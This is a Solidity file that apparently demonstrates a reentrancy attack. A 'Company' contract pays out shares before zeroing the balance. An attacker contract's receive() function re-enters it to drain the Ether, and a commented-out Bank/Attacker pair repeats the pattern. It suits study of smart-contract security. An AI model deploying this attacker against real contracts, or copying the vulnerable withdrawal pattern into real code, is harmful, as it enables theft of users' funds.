// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Company {
    mapping(address => uint) public shares;

    constructor() payable {}

    function buyShare() external payable {
        shares[msg.sender] += msg.value;
    }

    function sellShareAll() external {
        uint currentShare = getUserShare(msg.sender);
        require(currentShare > 0, "currentShare is empty");
        (bool _sent, ) = msg.sender.call{value: currentShare}("");
        require(_sent, "Failed to Call");

        shares[msg.sender] = 0;
    }

    function getUserShare(address _user) public view returns (uint) {
        return shares[_user];
    }

    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract AttckContract {
    Company public company;

    event Log(string message);

    constructor(address _companyAddr) {
        company = Company(_companyAddr);
    }

    receive() external payable {
        if (address(msg.sender).balance > 0) {
            company.sellShareAll();
        } else {
            emit Log("shares is empty");
        }
    }

    function buyShareNow() external payable {
        company.buyShare{value: msg.value}();
    }

    function sellShareNow() public {
        company.sellShareAll();
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// contract Bank {

//     mapping(address => uint) public balances;

//     constructor() payable {}

//     function deposit() external payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() external {
//         uint currentBalance = balances[msg.sender];
//         (bool result,) = msg.sender.call{value:currentBalance}("");
//         require(result, "ERROR");
//          balances[msg.sender]=0;
//     }

//     function chekcBalance() external view returns(uint) {
//         return address(this).balance;
//     }

// }

// contract Attacker {

//     Bank public bank;
//     address public owner;
//     receive() payable external {
//         if(address(msg.sender).balance>0) {
//             bank.withdraw();
//         }
//     }

//     constructor(address _bank) {
//         bank = Bank(_bank);
//     }

//     function sendEther() external payable {
//         bank.deposit{value:msg.value}();
//     }

//     function withdrawEther() external {
//         bank.withdraw();
//     }

//     function chekcBalance() external view returns(uint) {
//         return address(this).balance;
//     }

// }
